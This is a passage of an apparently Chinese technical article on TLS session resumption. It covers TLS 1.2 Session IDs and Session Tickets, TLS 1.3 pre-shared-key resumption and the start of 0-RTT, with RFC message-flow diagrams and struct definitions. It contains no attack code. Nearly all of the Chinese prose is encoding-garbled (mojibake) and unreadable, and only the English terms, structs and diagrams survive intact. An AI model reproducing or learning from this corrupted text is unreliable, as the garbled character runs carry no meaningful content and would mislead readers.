åšå‡ºäº†è§„å®šï¼Œå…¶é•¿åº¦ä¸º 0-32 ä½ï¼š\nopaque SessionID\u0026lt;0..32\u0026gt;; åŒæ—¶ RFC å»ºè®® Session IDçš„å¯¿å‘½ä¸Šé™ä¸º24å°æ—¶ï¼Œå› ä¸ºè·å¾—master_secretçš„æ”»å‡»è€…å¯èƒ½ä¼šå†’å……è¢«å…¥ä¾µçš„ä¸€æ–¹ï¼Œç›´åˆ°ç›¸åº”çš„ Session ID å¤±æ•ˆã€‚\næ•´ä¸ªé‡ç”¨è¿‡ç¨‹æˆ‘ä»¬å¯ä»¥ä»ä¸‹å›¾æ¯”è¾ƒç›´è§‚çš„çœ‹åˆ°ï¼š\n \nå®¢æˆ·ç«¯é¦–å…ˆå‘é€äº†ä¸€ä¸ª Client Hello æ¶ˆæ¯ç»™æœåŠ¡ç«¯ï¼Œå¹¶ä¸”å…¶ Session ID ä¸ºç©ºï¼Œè¿™æ—¶å€™ Server å“åº”äº† Server Hello å½“ä¸­å°±ä¼šè¿”å›ä¸€ä¸ª 32 å­—èŠ‚é•¿åº¦çš„ Session IDã€‚ç°åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„ TLS ä¼šè¯ç¼“å­˜ä¸­éƒ½å­˜å‚¨äº† Session IDï¼Œå…¶å€¼ä¸º 56bcf9f6ea40ac1bbf05ff7fd209d423da9f96404103226c7f927ad7a2992433ã€‚è¿™æ ·åšçš„å¥½å¤„å°±æ˜¯ï¼Œåœ¨ä¸‹ä¸€æ¬¡TLSè¿æ¥è¯·æ±‚ä¸­ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦å†ç»å†å®Œæ•´çš„TLSæ¡æ‰‹ã€‚\n \nå®¢æˆ·ç«¯åªéœ€åœ¨å…¶ Client Hello æ¶ˆæ¯ä¸­å‘é€ä¹‹å‰ä» Server é‚£é‡Œå¾—çŸ¥çš„ Session ID ï¼Œç„¶å Server ç¡®è®¤è¿™ä¸ª Session ID åœ¨å®ƒçš„ TLS ä¼šè¯ç¼“å­˜ä¹‹åï¼Œå®ƒä»¬å°±ä¼šè¿›è¡Œæ‰€è°“çš„ Abbreviated TLS Handshake ã€‚åœ¨è¿™æ¬¡ TLS æ¡æ‰‹è¿‡ç¨‹ä¸­ä¸ä¼šäº¤æ¢è¯ä¹¦æˆ–å¯†é’¥ä¿¡æ¯ï¼Œä¹‹å‰åå•†å¥½çš„å¯†é’¥ä¼šè¢«é‡æ–°ä½¿ç”¨ï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸€æ¬¡ TLS Session Resumption ã€‚\nTLS 1.2 Session Resumption - Session Ticket ç„¶è€Œï¼ŒSession ID æœºåˆ¶çš„ä¸€ä¸ªå®é™…é™åˆ¶æ˜¯è¦æ±‚æœåŠ¡å™¨ä¸ºæ¯ä¸ªå®¢æˆ·ç«¯åˆ›å»ºå’Œç»´æŠ¤ä¸€ä¸ªä¼šè¯ç¼“å­˜ã€‚è¿™å°±å¯¼è‡´äº†æœåŠ¡å™¨ä¸Šçš„å‡ ä¸ªé—®é¢˜ï¼Œæ¯å¤©å¯èƒ½ä¼šæœ‰æˆåƒä¸Šä¸‡ç”šè‡³ä¸Šç™¾ä¸‡ä¸ªç‹¬ç‰¹çš„è¿æ¥ï¼›æ¯ä¸€ä¸ªæ‰“å¼€çš„TLSè¿æ¥éƒ½ä¼šæ¶ˆè€—å†…å­˜ï¼Œéœ€è¦ Session ID ç¼“å­˜å’Œåˆ é™¤ç­–ç•¥ï¼Œä»¥åŠå¯¹äºæœ‰è®¸å¤šæœåŠ¡å™¨çš„çƒ­é—¨ç½‘ç«™çš„éƒ¨ç½²æŒ‘æˆ˜ï¼Œç†æƒ³æƒ…å†µä¸‹ï¼Œè¿™äº›ç½‘ç«™åº”è¯¥ä½¿ç”¨å…±äº«çš„ TLS Session ç¼“å­˜ä»¥è·å¾—æœ€ä½³æ€§èƒ½ã€‚å› æ­¤ï¼Œå¯¹äºä»»ä½•å¤šæœåŠ¡å™¨çš„éƒ¨ç½²ï¼ŒSession ID éƒ½éœ€è¦ä¸€äº›ä»”ç»†çš„æ€è€ƒå’Œç³»ç»Ÿæ¶æ„ï¼Œä»¥ç¡®ä¿ä¼šè¯ç¼“å­˜çš„è‰¯å¥½è¿è¡Œã€‚\nä¸ºäº†è§£å†³æœåŠ¡å™¨ç«¯éƒ¨ç½² TLS ä¼šè¯ç¼“å­˜çš„è¿™ä¸€é—®é¢˜ï¼Œå¼•å…¥äº† Session Ticket (RFC 5077)æ›¿æ¢æœºåˆ¶ï¼Œå®ƒå–æ¶ˆäº†æœåŠ¡å™¨ä¿ç•™æ¯ä¸ªå®¢æˆ·ç«¯ä¼šè¯çŠ¶æ€çš„è¦æ±‚ã€‚å–è€Œä»£ä¹‹çš„æ˜¯ï¼Œå¦‚æœå®¢æˆ·ç«¯è¡¨ç¤ºæ”¯æŒä¼šè¯ç¥¨ï¼ŒæœåŠ¡å™¨å¯ä»¥åŒ…å«ä¸€ä¸ªä¼šè¯ç¥¨è®°å½•ï¼Œå…¶ä¸­åŒ…æ‹¬æ‰€æœ‰ç”¨åªæœ‰æœåŠ¡å™¨çŸ¥é“çš„ç§˜å¯†å¯†é’¥åŠ å¯†çš„åå•†ä¼šè¯æ•°æ®ã€‚ç„¶åï¼Œè¯¥ä¼šè¯ç¥¨ç”±å®¢æˆ·ç«¯å­˜å‚¨ï¼Œå¹¶ä¸”å¯ä»¥åŒ…å«åœ¨åç»­ä¼šè¯çš„æ¡æ‰‹æ¶ˆæ¯ä¸­ã€‚å› æ­¤ï¼Œæ‰€æœ‰çš„ä¼šè¯æ•°æ®åªå­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œä½†ç¥¨æ®ä»ç„¶æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒæ˜¯ç”¨åªæœ‰æœåŠ¡å™¨çŸ¥é“çš„å¯†é’¥åŠ å¯†çš„ã€‚\nä¼šè¯ç¥¨æœºåˆ¶è¢«ç§°ä¸ºæ— çŠ¶æ€æ¢å¤æœºåˆ¶ã€‚æ— çŠ¶æ€æ¢å¤æœºåˆ¶çš„ä¸»è¦æ”¹è¿›æ˜¯å–æ¶ˆäº†æœåŠ¡å™¨ç«¯çš„ä¼šè¯ç¼“å­˜ï¼Œç®€åŒ–äº†éƒ¨ç½²ï¼Œè¦æ±‚å®¢æˆ·ç«¯åœ¨æ¯æ¬¡ä¸æœåŠ¡å™¨çš„æ–°è¿æ¥æ—¶æä¾›ä¼šè¯ç¥¨æ®ï¼Œç›´åˆ°ç¥¨æ®è¿‡æœŸã€‚\nTLS SessionTicket æ˜¯ä¸€ä¸ªæ‰©å±•ï¼Œå…¶åŸºäº RFC4366 ã€‚Ticket çš„æ ¼å¼æ˜¯ä¸€ä¸ª opaque çš„ç»“æ„ï¼Œç”¨äºæºå¸¦ç‰¹å®šä¼šè¯çš„çŠ¶æ€ä¿¡æ¯ã€‚RFC æ¨èçš„ Session Ticket ç»“æ„å¦‚ä¸‹ï¼š\nstruct { uint32 ticket_lifetime_hint; opaque ticket\u0026lt;0..2^16-1\u0026gt;; } NewSessionTicket; struct { opaque key_name[16]; opaque iv[16]; opaque encrypted_state\u0026lt;0..2^16-1\u0026gt;; opaque mac[32]; } ticket; è¿™ä¸ªæ‰©å±•å¯ä»¥åœ¨ ClientHello å’Œ ServerHello ä¸­å‘é€ã€‚å¦‚æœå®¢æˆ·ç«¯æ‹¥æœ‰ä¸€ä¸ªæƒ³è¦ç”¨æ¥æ¢å¤ä¼šè¯çš„ ticketï¼Œé‚£ä¹ˆå®ƒå°±ä¼šåœ¨ ClientHello ä¸­çš„ SessionTicket æ‰©å±•ä¸­åŒ…å«è¿™ä¸ª ticketã€‚å¦‚æœå®¢æˆ·ç«¯æ²¡æœ‰ç¥¨æ®ï¼Œå¹¶ä¸”å‡†å¤‡åœ¨ NewSessionTicket æ¡æ‰‹æ¶ˆæ¯ä¸­æ¥æ”¶ç¥¨æ®ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»åœ¨ SessionTicket æ‰©å±•ä¸­åŒ…å«ä¸€ä¸ªé•¿åº¦ä¸ºé›¶çš„ Session Ticket ã€‚å¦‚æœå®¢æˆ·ç«¯ä¸å‡†å¤‡åœ¨ NewSessionTicket æ¡æ‰‹æ¶ˆæ¯ä¸­æ¥æ”¶ç¥¨æ®ï¼Œåˆ™å¿…é¡»ä¸åŒ…å« SessionTicket æ‰©å±•ï¼Œé™¤éå®¢æˆ·ç«¯å‘é€é€šè¿‡å…¶ä»–æ–¹å¼ä»æœåŠ¡å™¨æ”¶åˆ°çš„éç©ºç¥¨æ®ã€‚\n Client Server ClientHello (empty SessionTicket extension)--------\u0026gt; ServerHello (empty SessionTicket extension) Certificate* ServerKeyExchange* CertificateRequest* \u0026lt;-------- ServerHelloDone Certificate* ClientKeyExchange CertificateVerify* [ChangeCipherSpec] Finished --------\u0026gt; NewSessionTicket [ChangeCipherSpec] \u0026lt;-------- Finished Application Data \u0026lt;-------\u0026gt; Application Data Figure 1: Message Flow for Full Handshake Issuing New Session Ticket å¦‚ä¸Šæµç¨‹å›¾æ‰€ç¤ºï¼Œå®¢æˆ·ç«¯é€šè¿‡åœ¨ ClientHello æ¶ˆæ¯ä¸­åŒ…å«ä¸€ä¸ª SessionTicket TLS æ‰©å±•åæ¥è¡¨ç¤ºå®ƒæ”¯æŒè¿™ç§æœºåˆ¶ï¼Œæ­¤æ—¶ SessionTicket ä¸ºç©ºï¼ŒæœåŠ¡å™¨å°†å‘é€ä¸€ä¸ªç©ºçš„SessionTicket æ‰©å±•æ¥è¡¨ç¤ºå®ƒå°†ä½¿ç”¨ NewSessionTicket æ¡æ‰‹æ¶ˆæ¯å‘é€ä¸€ä¸ªæ–°çš„ Session Ticketï¼Œè¯¥æ¶ˆæ¯æ˜¯åœ¨æœåŠ¡å™¨æˆåŠŸéªŒè¯å®¢æˆ·ç«¯çš„ Finished æ¶ˆæ¯åï¼Œåœ¨ChangeCipherSpec æ¶ˆæ¯ä¹‹å‰çš„ TLS æ¡æ‰‹æœŸé—´å‘é€ã€‚åœ¨å¾—åˆ° Session Ticket åï¼ŒClient å°†è¯¥ Session Ticket ä¸ä¸»å¯†å’Œå…¶ä»–ä¸å½“å‰ä¼šè¯ç›¸å…³çš„å‚æ•°ä¸€èµ·ç¼“å­˜ã€‚\n Client Server ClientHello (SessionTicket extension) --------\u0026gt; ServerHello (empty SessionTicket extension) NewSessionTicket [ChangeCipherSpec] \u0026lt;-------- Finished [ChangeCipherSpec] Finished --------\u0026gt; Application Data \u0026lt;-------\u0026gt; Application Data Figure 2: Message Flow for Abbreviated Handshake Using New Session Ticket å½“å®¢æˆ·ç«¯å¸Œæœ›æ¢å¤ä¼šè¯æ—¶ï¼Œå®ƒåœ¨ ClientHello æ¶ˆæ¯ä¸­çš„ SessionTicket æ‰©å±•ä¸­åŒ…å«è¯¥ç¥¨æ®ã€‚ç„¶åæœåŠ¡å™¨å¯¹æ”¶åˆ°çš„ç¥¨æ®è¿›è¡Œè§£å¯†ï¼ŒéªŒè¯ç¥¨æ®çš„æœ‰æ•ˆæ€§ï¼Œä»ç¥¨æ®çš„å†…å®¹ä¸­æ£€ç´¢ä¼šè¯çŠ¶æ€ï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªçŠ¶æ€æ¥æ¢å¤ä¼šè¯ã€‚å¦‚æœæœåŠ¡å™¨æˆåŠŸéªŒè¯äº†å®¢æˆ·ç«¯çš„ç¥¨æ®ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨ ServerHello ä¹‹ååŠ å…¥ NewSessionTicket æ¡æ‰‹æ¶ˆæ¯æ¥ç»­è®¢ç¥¨æ®ã€‚\næˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹æ¥è¿›ä¸€æ­¥äº†è§£è¿™ä¸ªæœºåˆ¶ï¼š\n \nå®¢æˆ·ç«¯é¦–å…ˆé€šè¿‡åœ¨ Client Hello æ¶ˆæ¯ä¸­æ·»åŠ  SessionTickets TLS Extension æ¥è¡¨æ˜å®ƒæ”¯æŒæ— çŠ¶æ€ä¼šè¯æ¢å¤ï¼ˆç»¿è‰²éƒ¨åˆ†ï¼‰ï¼Œ Server è¿˜ä¼šé€šè¿‡å‘é€åŒ…å«æœ‰ç©ºçš„ SessionTicket TLS Extension çš„ Server Hello æ¶ˆæ¯ç»™ Client ï¼Œè¡¨ç¤º Server æ”¯æŒ SessionTicket TLS Extensionï¼ˆçº¢è‰²éƒ¨åˆ†ï¼‰ã€‚\n \nåœ¨æ¡æ‰‹å®Œæˆä¹‹å‰ï¼Œä¹Ÿå°±æ˜¯ Finished ä¹‹å‰ï¼ŒServer ä¼šå‘é€ä¸€ä¸ªåä¸º New Session Ticket çš„æ–° TLS æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«åŠ å¯†çš„ä¼šè¯ä¿¡æ¯ï¼ˆå¦‚ä¸»å¯†ã€ä½¿ç”¨çš„å¯†ç ç­‰ï¼‰ï¼ŒServer å¯ä»¥åœ¨ç¨åä½¿ç”¨å®ƒä¸“é—¨ä¸ºæ­¤ç”Ÿæˆçš„å”¯ä¸€å¯†é’¥è¿›è¡Œè§£å¯†ã€‚ä»è¿™ä¸€ç‚¹å¼€å§‹ï¼ŒClient ä¼šå°† Session Ticket ä¿å­˜åœ¨å®ƒçš„ TLS ç¼“å­˜ä¸­ï¼Œç›´åˆ°ä¸‹ä¸€æ¬¡å®ƒåœ¨ Session Ticketè¿‡æœŸä¹‹å‰éƒ½å¯ä»¥ä½¿ç”¨å®ƒä¸ä¹‹å‰çš„ Server æ¢å¤ TLS ä¼šè¯ã€‚\n \nç°åœ¨ï¼Œå½“ Client æƒ³è¦é‡æ–°ä½¿ç”¨ä¹‹å‰çš„ä¼šè¯æ—¶ï¼Œå®ƒåœ¨ Client Hello æ¶ˆæ¯çš„ SessionTicket TLS Extension ä¸­å‘é€äº† Session Ticketï¼Œæ­¤æ—¶æˆ‘ä»¬æ‰€æ³¨æ„åˆ°ï¼Œå®¢æˆ·ç«¯ä¹Ÿåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ä¼šè¯ ID ï¼Œç”¨äºä»¥ä¸‹ç›®çš„ï¼š\n æœåŠ¡å™¨å›å¤ç›¸åŒçš„ Session ID è¡¨ç¤º Server æ¥å— Session Ticket ï¼Œå¹¶å°†é‡ç”¨è¯¥ Session ã€‚ æœåŠ¡å™¨å›å¤ç©ºçš„/ä¸åŒçš„ Session ID ï¼šServer å†³å®šè¿›è¡Œå®Œå…¨æ¡æ‰‹ï¼ŒåŸå› æ˜¯å¯èƒ½æ˜¯ Session Ticket è¿‡æœŸäº†ï¼Œæˆ–è€…å®ƒæ­£åœ¨æ¢å¤åŸæ¥çš„ä¼šè¯ã€‚ PSï¼šè¿™æ ·çš„ Session ID å¹¶ä¸å­˜å‚¨åœ¨ Server ä¸Šï¼Œå¦åˆ™ä¼šç ´åæ— çŠ¶æ€ä¼šè¯é‡ç”¨çš„ç›®çš„ã€‚è¿™æ˜¯ä¸€æ¬¡æ€§ä½¿ç”¨ï¼Œåªæ˜¯ä¸ºäº†å‘ Client è¡¨ç¤º Server æ¥å—äº†ä»–ä»¬å‘é€çš„session ticketã€‚  åœ¨ä¸Šè¿°çš„ä¾‹å­ä¸­ï¼ŒServer æˆåŠŸæ¥å—å¹¶é‡ç”¨äº† TLS ä¼šè¯ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®è®¤è¿›è¡Œäº†ä¸€ä¸ª Abbreviated TLS æ¡æ‰‹ï¼Œå¹¶ä¸”åœ¨æœåŠ¡å™¨çš„ Server Hello æ¶ˆæ¯ä¸­ï¼ŒServer å›å¤äº†å®¢æˆ·ç«¯å‘é€çš„ç›¸åŒ Session ID ã€‚è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„åŸºäº Session Ticket æœºåˆ¶çš„ Session Resumption ï¼ŒæœåŠ¡ç«¯ä¸éœ€è¦åœ¨æœ¬åœ°å­˜å‚¨ä¼šè¯ä¿¡æ¯ï¼Œå› æ­¤ä¸æœ‰çŠ¶æ€çš„ä¼šè¯æ¢å¤ç›¸æ¯”ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ›´å…·æ‰©å±•æ€§çš„é€‰æ‹©ã€‚\nTLS 1.3 TLS 1.3 Overview TLS 1.3 å¯ä»¥è¯´æ˜¯ TLS 1.2 çš„å‡çº§ç‰ˆæœ¬ï¼Œå®ƒåœ¨ RFC 8446 ä¸­å®šä¹‰ï¼Œäº 2018 å¹´ 8 æœˆå‘è¡¨ã€‚æˆ‘ä»¬è¿™é‡Œç®€è¦çš„ä»‹ç»å‡ ä¸ªæˆ‘ä»¬æ¯”è¾ƒå…³å¿ƒçš„æ”¹åŠ¨ï¼š\n å‡å°‘æ¡æ‰‹ç­‰å¾…æ—¶é—´ï¼Œå°†æ¡æ‰‹æ—¶é—´ä» 2-RTT é™ä½åˆ° 1-RTTï¼Œå¹¶ä¸”å¢åŠ  0-RTT æ¨¡å¼ã€‚ åºŸé™¤ Session ID å’Œ Session Ticket ä¼šè¯æ¢å¤æ–¹å¼ï¼Œç»Ÿä¸€é€šè¿‡ PSK çš„æ–¹å¼è¿›è¡Œä¼šè¯æ¢å¤ï¼Œå¹¶åœ¨ NewSessionTicket æ¶ˆæ¯ä¸­æ·»åŠ è¿‡æœŸæ—¶é—´å’Œç”¨äºæ··æ·†æ—¶é—´çš„åç§»å€¼ã€‚  åœ¨æ¡æ‰‹æ—¶ç›¸å¯¹äº TLS 1.2 å‘ç”Ÿäº†æ¯”è¾ƒæ˜æ˜¾çš„æ”¹åŠ¨ï¼š\n ä¸ TLS 1.2 æ¡æ‰‹ç±»ä¼¼ï¼ŒTLS 1.3 æ¡æ‰‹ä»¥ Client Hello æ¶ˆæ¯å¼€å§‹ï¼Œä½†æœ‰ä¸€ä¸ªé‡è¦çš„å˜åŒ–å°±æ˜¯å®¢æˆ·ç«¯å‘é€æ”¯æŒçš„åŠ å¯†å¥—ä»¶åˆ—è¡¨ï¼Œå¹¶çŒœæµ‹æœåŠ¡å™¨å¯èƒ½é€‰æ‹©çš„å¯†é’¥åè®®åè®®ï¼Œä¹Ÿä¼šå‘é€å®ƒå¯¹è¯¥ç‰¹å®šå¯†é’¥åè®®åè®®çš„å¯†é’¥å…±äº«ã€‚ Server åœ¨å›å¤ Server Hello æ—¶ï¼ŒæœåŠ¡å™¨å›å¤å®ƒæ‰€é€‰æ‹©çš„å¯†é’¥åè®®åè®®ï¼Œå…¶ä¸­ä¹ŸåŒ…æ‹¬æœåŠ¡å™¨çš„å¯†é’¥å…±äº«ã€è¯ä¹¦ä»¥åŠ Server Finished ã€‚ ç°åœ¨ï¼Œå®¢æˆ·ç«¯æ£€æŸ¥æœåŠ¡å™¨è¯ä¹¦ï¼Œç”Ÿæˆå¯†é’¥ï¼Œå¹¶å‘é€ Client Finished ï¼Œä¹‹åå°±å¯ä»¥å‘é€åŠ å¯†æ•°æ®äº†ã€‚  è¿™æ ·ä¸€æ¥ï¼ŒTLS 1.3 æ¡æ‰‹å°±èŠ‚çœäº†æ•´æ•´ä¸€ä¸ªæ¥å›å’Œæ•°ç™¾æ¯«ç§’çš„æ—¶é—´ï¼Œæ¯” TLS 1.2 æ¡æ‰‹æœ‰äº†å¾ˆå¤§çš„æ”¹è¿›ã€‚RFC 8446 æä¾›çš„ç®€è¦æµç¨‹å›¾å¦‚ä¸‹ï¼š\n Client Server Key ^ ClientHello Exch | + key_share* | + signature_algorithms* | + psk_key_exchange_modes* v + pre_shared_key* --------\u0026gt; ServerHello ^ Key + key_share* | Exch + pre_shared_key* v {EncryptedExtensions} ^ Server {CertificateRequest*} v Params {Certificate*} ^ {CertificateVerify*} | Auth {Finished} v \u0026lt;-------- [Application Data*] ^ {Certificate*} Auth | {CertificateVerify*} v {Finished} --------\u0026gt; [Application Data] \u0026lt;-------\u0026gt; [Application Data] + Indicates noteworthy extensions sent in the previously noted message. * Indicates optional or situation-dependent messages/extensions that are not always sent. {} Indicates messages protected using keys derived from a [sender]_handshake_traffic_secret. [] Indicates messages protected using keys derived from [sender]_application_traffic_secret_N. Figure 1: Message Flow for Full TLS Handshake TLS 1.2 ä¸ 1.3 ç®€è¦çš„æ¡æ‰‹å¯¹æ¯”å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n \nTLS 1.3 Session Resumption - PSK æŒ‰ç…§ä¸Šæ–‡æ‰€è¯´ï¼ŒTLS 1.3 ç”¨é€šè¿‡é¢„å…±äº«å¯†é’¥ï¼ˆPre-Shared Key, PSKï¼‰æ¢å¤ä¼šè¯çš„æ¦‚å¿µå–ä»£äº† 1.2 å½“ä¸­çš„ Session ID å’Œ Session Ticket ã€‚åœ¨æœ€åˆçš„æ¡æ‰‹ä¹‹åï¼ŒæœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª PSK æ ‡è¯†ã€‚ PSK å†…å®¹å–å†³äºæœåŠ¡å™¨ï¼Œå¯èƒ½åŒ…å«ä¸€ä¸ªæ•°æ®åº“æŸ¥è¯¢å¯†é’¥æˆ–ä¸€ä¸ªè‡ªæˆ‘åŠ å¯†å’Œè‡ªæˆ‘è®¤è¯çš„ç¥¨æ®ã€‚å®¢æˆ·ç«¯å°†æ­¤PSKèº«ä»½ä¸è‡ªå·±çš„ä¼šè¯å¯†é’¥ä¸€èµ·å­˜å‚¨ã€‚å…¶ä¸­ï¼Œ RFC 8446 å®šä¹‰çš„ PSK ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š\n struct { opaque identity\u0026lt;1..2^16-1\u0026gt;; uint32 obfuscated_ticket_age; } PskIdentity; opaque PskBinderEntry\u0026lt;32..255\u0026gt;; struct { PskIdentity identities\u0026lt;7..2^16-1\u0026gt;; PskBinderEntry binders\u0026lt;33..2^16-1\u0026gt;; } OfferedPsks; struct { select (Handshake.msg_type) { case client_hello: OfferedPsks; case server_hello: uint16 selected_identity; }; } PreSharedKeyExtension; åœ¨éšåçš„æ¡æ‰‹ä¸­ï¼Œå®¢æˆ·ç«¯åœ¨ç»™æœåŠ¡å™¨çš„ ClientHello æ¶ˆæ¯ä¸­æä¾›è¿™ä¸ª PSK ï¼ŒæœåŠ¡å™¨æ ¹æ® PSK çš„å†…å®¹å¯¹ç¥¨æ®è¿›è¡Œè§£å¯†ï¼Œå¹¶ä½¿ç”¨åŒ…å«çš„ä¼šè¯å¯†é’¥å’Œè¿æ¥çŠ¶æ€æ¥æ¢å¤ä¼šè¯ï¼Œæˆ–è€…æœåŠ¡å™¨ä½¿ç”¨åŒ…å«çš„æŸ¥æ‰¾å¯†é’¥åœ¨è‡ªå·±çš„æ•°æ®åº“ä¸­æŸ¥æ‰¾ä¼šè¯å¯†é’¥å’Œè¿æ¥çŠ¶æ€ã€‚ RFC 8446 æä¾›äº†ä¸€ä¸ª Session Resumption çš„æµç¨‹å›¾å¦‚ä¸‹ï¼š\n Client Server Initial Handshake: ClientHello + key_share --------\u0026gt; ServerHello + key_share {EncryptedExtensions} {CertificateRequest*} {Certificate*} {CertificateVerify*} {Finished} \u0026lt;-------- [Application Data*] {Certificate*} {CertificateVerify*} {Finished} --------\u0026gt; \u0026lt;-------- [NewSessionTicket] [Application Data] \u0026lt;-------\u0026gt; [Application Data] Subsequent Handshake: ClientHello + key_share* + pre_shared_key --------\u0026gt; ServerHello + pre_shared_key + key_share* {EncryptedExtensions} {Finished} \u0026lt;-------- [Application Data*] {Finished} --------\u0026gt; [Application Data] \u0026lt;-------\u0026gt; [Application Data] Figure 3: Message Flow for Resumption and PSK  å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªå¸¦æœ‰ key_share æ‰©å±•çš„ ClientHello æ¶ˆæ¯ã€‚è¯¥æ‰©å±•åˆ—å‡ºäº†å®¢æˆ·ç«¯æ”¯æŒçš„å¯†é’¥äº¤æ¢åŠ å¯†æ–¹æ³•ã€‚ æœåŠ¡å™¨ç”¨ä¸€ä¸ªå¸¦æœ‰ key_share æ‰©å±•åçš„ ServerHello æ¶ˆæ¯è¿›è¡Œå“åº”ï¼Œè¿™ä¸ªæ‰©å±•åŒ…å«äº†å®ƒè¦ç”¨äºå¯†é’¥äº¤æ¢çš„åŠ å¯†æ–¹æ³•ï¼Œå¹¶ä¸”æœåŠ¡å™¨å°†å…¶å‚æ•°ä¸€åŒå‘é€ç»™å®¢æˆ·ç«¯ã€‚ æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éƒ½äº¤æ¢è®¤è¯æ¶ˆæ¯ã€‚ æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€ NewSessionTicket æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª PSK ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡åœ¨ ClientHello æ¶ˆæ¯çš„ pre_shared_key æ‰©å±•ä¸­åŒ…å«è¿™ä¸ª PSK ï¼Œç”¨äºæœªæ¥çš„æ¡æ‰‹ã€‚ å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç°åœ¨å¯ä»¥äº¤æ¢åŠ å¯†çš„åº”ç”¨æ•°æ®ã€‚ åœ¨æœªæ¥çš„æ¡æ‰‹ä¸­ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªåŒ…å« key_share å’Œ pre_shared_key æ‰©å±•åçš„ ClientHello æ¶ˆæ¯ã€‚ pre_shared_key æ‰©å±•åŒ…å« NewTicketSession æ¶ˆæ¯ä¸­å‘é€çš„ PSK ã€‚ æœåŠ¡å™¨ç”¨åŒ…å« pre_shared_key å’Œ key_share æ‰©å±•åçš„ ServerHello æ¶ˆæ¯ä½œå‡ºå“åº”ã€‚ pre_shared_key æ‰©å±•åŒ…å«æœåŠ¡å™¨åŒæ„ä½¿ç”¨çš„ PSK ï¼Œå¹¶å°†å…¶å‚æ•°å‘é€ç»™å®¢æˆ·ç«¯ã€‚ æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯äº’ç›¸å‘é€ Finished æ¶ˆæ¯ï¼Œä¹‹åå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¯ä»¥äº¤æ¢åŠ å¯†çš„åº”ç”¨æ•°æ®ã€‚  æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥ç›´è§‚æ„Ÿå—ä¸€ä¸‹ TLS 1.3 åŸºäº PSK çš„æ¡æ‰‹è¿‡ç¨‹ï¼š\n \nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒClient ç¬¬ä¸€æ¬¡ä¸ Server æ¡æ‰‹å‘é€ Client Hello æ¶ˆæ¯æ—¶ï¼ŒåªåŒ…å«äº† key_share æ‹“å±•ï¼ŒServer ä¹Ÿåšå‡ºå“åº”çš„å›åº”ï¼Œä½¿ç”¨åŒ…å« key_share æ‹“å±•çš„æ¶ˆæ¯è¿›è¡Œå›åº”ã€‚\n \nClient åœ¨ç¬¬äºŒæ¬¡å‘é€ Client Hello æ¶ˆæ¯æ—¶ï¼Œå¸¦ä¸Šäº†ä¹‹å‰ Server åœ¨ NewSessionTicket å‘é€çš„ pre_shared_key ï¼Œå°†å…¶ä½œä¸ºæ‹“å±•å‘é€è‡³ Server ï¼Œéšå Server å“åº” Server Hello æ¶ˆæ¯æ—¶ï¼Œä¹Ÿä½¿ç”¨ pre_shared_key ä½œä¸ºæ‹“å±•å“åº”ï¼Œè¿™æ ·å°±å®Œæˆäº†åŸºäº PSK çš„ Session Resumption\n \nå¯èƒ½æœ‰åŒå­¦ä¼šé—®ä¸ºä»€ä¹ˆæˆ‘ä»¬çœ‹ä¸åˆ°ç±»ä¼¼ TLS 1.2 å½“ä¸­ç›´æ¥æœ‰ä¸€ä¸ª NewSessionTicket å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä»”ç»†å›é¡¾ä¸€ä¸‹ä¸Šé¢çš„ RFC æµç¨‹å›¾ï¼ŒServer è¿”å›çš„ NewSessionTicket æ¶ˆæ¯æœ‰ä¸ªä¸­æ‹¬å·ï¼Œè€Œè¿™é‡Œçš„ä¸­æ‹¬å·è¡¨ç¤ºçš„æ˜¯ä½¿ç”¨ä» [sender]_application_traffic_secret_N å¯¼å‡ºçš„å¯†é’¥ä¿æŠ¤çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ wireshark æ— æ³•ç›´æ¥çœ‹åˆ°å…¶ä¸­çš„å†…å®¹ï¼Œä½†æ˜¯å…¶ä¸­æˆ‘ä»¬ä½¿ç”¨ opnssl æ—¶å€™èƒ½å¤Ÿæ›´æ˜æ˜¾çš„çœ‹åˆ° Server å‘è¿‡æ¥çš„ TLS Session Ticket ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ Client åœ¨è¿›è¡Œæ¢å¤ä¼šè¯æ—¶æ‰€æºå¸¦çš„ PSK ï¼Œåœ¨ä½¿ç”¨ openssl è¿›è¡Œæ¢å¤ä¼šè¯æ—¶ï¼Œå°±ä¼šæç¤ºæˆ‘ä»¬å·²ç»æ¢å¤äº†ä¼šè¯ã€‚è¿™æ ·å°±å®Œæˆäº†ä¸€æ¬¡ Session Resumption\nTLS 1.3 Session Resumption - 0-RTT è™½ç„¶ TLS 1.3 æœ€å¤§çš„äº®ç‚¹ä¹‹ä¸€æ˜¯ 0-RTT 